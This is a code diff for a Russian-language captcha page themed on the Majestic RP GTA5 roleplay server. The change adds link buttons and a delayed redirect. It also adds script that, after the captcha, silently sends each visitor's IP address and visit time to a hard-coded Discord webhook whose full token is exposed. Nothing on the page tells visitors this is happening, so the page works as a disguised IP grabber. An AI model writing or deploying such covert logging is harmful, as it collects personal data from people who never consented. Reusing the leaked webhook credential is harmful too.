@@ -31,7 +31,7 @@
     .title {
       font-size: 3em;
       font-weight: bold;
-      color: #ff69b4; /* розовый */
+      color: #ff69b4;
       animation: glow 2s infinite ease-in-out;
       text-shadow: 0 0 10px #ff69b4, 0 0 20px #ff69b4;
     }
@@ -47,6 +47,10 @@
       margin: 20px 0;
     }
 
+    .g-recaptcha {
+      margin-top: 10px;
+    }
+
     button {
       padding: 10px 20px;
       font-size: 1em;
@@ -54,8 +58,25 @@
       cursor: pointer;
     }
 
-    .g-recaptcha {
-      margin-top: 10px;
+    .links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      margin-top: 30px;
+      gap: 10px;
+    }
+
+    .links a {
+      background: #ff69b4;
+      color: white;
+      padding: 10px 15px;
+      border-radius: 5px;
+      text-decoration: none;
+      transition: background 0.3s;
+    }
+
+    .links a:hover {
+      background: #ff1493;
     }
   </style>
 
@@ -69,20 +90,31 @@
     <!-- Капча -->
     <div class="g-recaptcha" data-sitekey="6LegMmUrAAAAADqD9jsGKNPMsPe0k5QouYIczVAV"></div>
     <button onclick="submitCaptcha()">Продолжить</button>
+
+    <!-- Кнопки -->
+    <div class="links" id="links" style="display: none;">
+      <a href="https://forum.majestic-rp.ru/" target="_blank">Форум</a>
+      <a href="https://discordapp.com/invite/wA6USvd" target="_blank">Discord</a>
+      <a href="https://majestic-mods.ru/" target="_blank">Моды</a>
+      <a href="https://antia-bot.ru/gta5-majestic-rp-bot" target="_blank">Бот</a>
+      <a href="https://wiki.majestic-rp.ru/" target="_blank">WIKI</a>
+    </div>
   </div>
 
   <script>
+    let userIP = 'Неизвестен';
+
     // Получение IP-адреса
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
       .then(data => {
-        document.getElementById('ip').textContent = 'Ваш IP: ' + data.ip;
+        userIP = data.ip;
+        document.getElementById('ip').textContent = 'Ваш IP: ' + userIP;
       })
       .catch(() => {
         document.getElementById('ip').textContent = 'Не удалось определить IP';
       });
 
-    // Обработка капчи
     function submitCaptcha() {
       const response = grecaptcha.getResponse();
       if (!response) {
@@ -90,10 +122,26 @@
         return;
       }
 
-      // Капча пройдена — редирект
-      window.location.href = 'https://majestic-rp.ru/';
+      // Отправка в Discord Webhook
+      const timestamp = new Date().toLocaleString();
+      const payload = {
+        content: `📥 **Новый пользователь зашёл на сайт**\nIP: \`${userIP}\`\n🕒 Время: ${timestamp}`
+      };
+
+      fetch("https://discord.com/api/webhooks/1384884637465055355/EBKEbxw-xGZB9n812dNzzszG1--teU1uZVQn0JRGnQzM4CtNSoxL3-WUo1WrU9m6aPoA", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      });
+
+      // Показываем кнопки и перенаправляем через 5 секунд
+      document.getElementById('links').style.display = 'flex';
+      setTimeout(() => {
+        window.location.href = 'https://majestic-rp.ru/';
+      }, 5000);
     }
   </script>
 </body>
 </html>
-🔍 Что изменено:
